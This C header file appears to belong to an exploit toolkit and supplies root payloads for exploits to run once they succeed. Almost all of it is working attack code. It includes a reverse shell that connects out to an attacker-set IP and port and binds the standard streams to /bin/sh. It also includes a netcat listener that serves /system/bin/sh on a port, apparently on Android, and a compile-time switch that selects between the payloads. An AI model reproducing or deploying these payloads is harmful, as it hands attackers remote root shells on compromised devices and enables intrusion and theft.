#ifndef ROOT_PAYLOAD_H
#define ROOT_PAYLOAD_H

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#ifndef ROOT_PAYLOAD_PORT
#define ROOT_PAYLOAD_PORT 6969
#endif

// Provides various different root payloads for exploits to use

static void reverse_shell(const char *ip, unsigned short port) {
  int sock;
	struct sockaddr_in target;

	// Create the socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		perror("socket");
		exit(1);
	}

	// Configure the target address
	target.sin_family = AF_INET;
	target.sin_port = htons(port);  // Port 4444
	inet_pton(AF_INET, ip, &target.sin_addr);  // IP address

	// Connect to the target
	if (connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
		perror("connect");
		exit(1);
	}

	// Redirect stdin, stdout, stderr to the socket
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	// Spawn the shell
	execl("/bin/sh", "sh", NULL);
}

static void listening_shell(unsigned short port) {
  char buf[128] = { 0 };
  snprintf(buf, sizeof(buf), "nc -s 127.0.0.1 -p %hu -L /system/bin/sh -l", port);

  system(buf);
}

static void shell() {
	execlp("/bin/sh","/bin/sh",NULL);
}

// executes the correct root payload based on what exploit is configured for
static void root_payload() {
#ifdef REVERSE_SHELL
  reverse_shell(ROOT_PAYLOAD_IP, ROOT_PAYLOAD_PORT);
#elif LISTENING_SHELL
  listening_shell(ROOT_PAYLOAD_PORT);
#else
  shell();
#endif
}

#endif
